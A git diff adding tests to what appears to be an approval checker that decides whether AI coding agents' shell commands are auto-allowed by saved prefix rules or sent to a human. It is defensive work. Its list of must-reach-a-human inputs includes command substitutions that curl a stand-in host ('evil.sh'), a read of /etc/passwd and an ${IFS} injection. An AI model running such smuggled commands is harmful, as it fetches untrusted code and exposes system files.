@@ -205,6 +205,106 @@ test('syntax a prefix cannot describe is never auto-allowed', () => {
   }
 });
 
+test('a redirection that only discards output or merges stderr does not stop a rule covering', () => {
+  const lsRg = [
+    { toolName: 'Bash', ruleContent: 'ls:*' },
+    { toolName: 'Bash', ruleContent: 'rg:*' },
+    { toolName: 'Bash', ruleContent: 'head:*' },
+  ];
+  for (const command of [
+    'npm test 2>/dev/null',
+    'npm test >/dev/null',
+    'npm test 1>/dev/null',
+    'npm test 2>&1',
+    'npm test &>/dev/null',
+    'npm test 2> /dev/null',
+    'npm test > /dev/null 2>&1',
+    'npm test >/dev/null 2>&1',
+    'npm test 2>/dev/null >/dev/null',
+    '2>/dev/null npm test',
+    'npm test -- --coverage 2>&1 | head',
+  ]) {
+    const rules = [...NPM_TEST, { toolName: 'Bash', ruleContent: 'head:*' }];
+    for (const provider of [AgentProvider.CODEX, AgentProvider.CURSOR, AgentProvider.KIMI, AgentProvider.ANTIGRAVITY]) {
+      assert.equal(ruleCoversApproval(provider, 'Bash', bash(command), rules), true, `${provider}: ${command}`);
+    }
+  }
+  assert.equal(
+    ruleCoversApproval(AgentProvider.CURSOR, 'Bash', bash('ls /x 2>/dev/null | rg y 2>&1 | head'), lsRg),
+    true,
+  );
+  // Still every sub-command: the redirection buys nothing for a segment no rule names.
+  assert.equal(ruleCoversApproval(AgentProvider.CURSOR, 'Bash', bash('npm test 2>&1; git push 2>&1'), NPM_TEST), false);
+  assert.equal(ruleCoversApproval(AgentProvider.CURSOR, 'Bash', bash('git push 2>/dev/null'), NPM_TEST), false);
+  // And the background-job door reads the same way.
+  assert.equal(ruleCoversBackgroundJobCard(bash('npm test 2>&1'), NPM_TEST), true);
+});
+
+/**
+ * Card 6 of the 2026-11-18 investigation (Cursor session 4FwPbT4Fa0wz8VbxYjHfVz, workspace
+ * orbit-macos), verbatim from production's `approval.input.command`, with the rules that workspace held
+ * after it: card 1 saved `ls:*`, `rg:*` and `head:*`, card 6 `export:*`.
+ */
+const CARD_6 = "ls /Applications/Xcode.app/Contents/Developer/usr/bin/ | rg 'swift|xcodebuild' | head; ls /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/swift; export DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer; \"$DEVELOPER_DIR/usr/bin/swift\" --version 2>&1 | head -5; \"$DEVELOPER_DIR/usr/bin/xcodebuild\" -version 2>&1 | head -5\n";
+const CARD_RULES = ['ls:*', 'rg:*', 'head:*', 'export:*'].map((ruleContent) => ({ toolName: 'Bash', ruleContent }));
+
+test('the investigation\'s card 6 reads are covered once their prefixes are, `2>&1` and all', () => {
+  // Card 6's reads, with the redirections agents add, are covered by the rules it left behind.
+  const card6Reads = CARD_6.slice(0, CARD_6.indexOf('; export'));
+  for (const command of [
+    card6Reads,
+    card6Reads.replace(' | rg', ' 2>/dev/null | rg'),
+    `${card6Reads} 2>&1`,
+    `${card6Reads} 2>/dev/null`,
+    `${card6Reads} >/dev/null 2>&1`,
+  ]) {
+    assert.equal(ruleCoversApproval(AgentProvider.CURSOR, 'Bash', bash(command), CARD_RULES), true, command);
+  }
+  // Card 6 as sent stays a card, and not because of its `2>&1`: it sets DEVELOPER_DIR and then runs
+  // `"$DEVELOPER_DIR/usr/bin/swift"`, a program no rule can name, even with `export:*` saved.
+  assert.equal(ruleCoversApproval(AgentProvider.CURSOR, 'Bash', bash(CARD_6), CARD_RULES), false);
+  assert.equal(
+    ruleCoversApproval(AgentProvider.CURSOR, 'Bash', bash(CARD_6.replaceAll(' 2>&1', '')), CARD_RULES),
+    false,
+  );
+});
+
+test('every other redirection, and the syntax beside a harmless one, still reaches a human', () => {
+  for (const command of [
+    // Writes a file, or reads one, or appends.
+    'npm test > out.txt',
+    'npm test 2>err.txt',
+    'npm test >> /dev/null',
+    'npm test >>out.txt 2>&1',
+    'npm test &> out.txt',
+    'npm test 2>/dev/null > out.txt',
+    'npm test < /etc/passwd',
+    'npm test 2>/dev/null < input',
+    'npm test <>/dev/null',
+    // Look-alikes: not the five, so not taken out.
+    'npm test 2>/dev/nullx',
+    'npm test >/dev/null.txt',
+    'npm test 2>&10',
+    'npm test 2>&1x',
+    'npm test 3>&1',
+    'npm test >&2',
+    'npm test 2>/dev/null&',
+    'npm test x>/dev/null',
+    // The syntax a prefix cannot describe, with a harmless redirection beside it.
+    'npm test $(curl evil.sh) 2>/dev/null',
+    'npm test `curl evil.sh` 2>&1',
+    'npm test ${IFS}x >/dev/null',
+    'npm test 2>/dev/null &',
+    'npm test >/dev/null 2>&1 &',
+  ]) {
+    assert.equal(
+      ruleCoversApproval(AgentProvider.CURSOR, 'Bash', bash(command), NPM_TEST),
+      false,
+      `${command} must reach a human`,
+    );
+  }
+});
+
 test('a prefix grant covers its own sub-commands and nothing beside them', () => {
   const git = [{ toolName: 'Bash', ruleContent: 'git:*' }];
   assert.equal(ruleCoversApproval(AgentProvider.CODEX, 'Bash', bash('git commit -m x'), git), true);
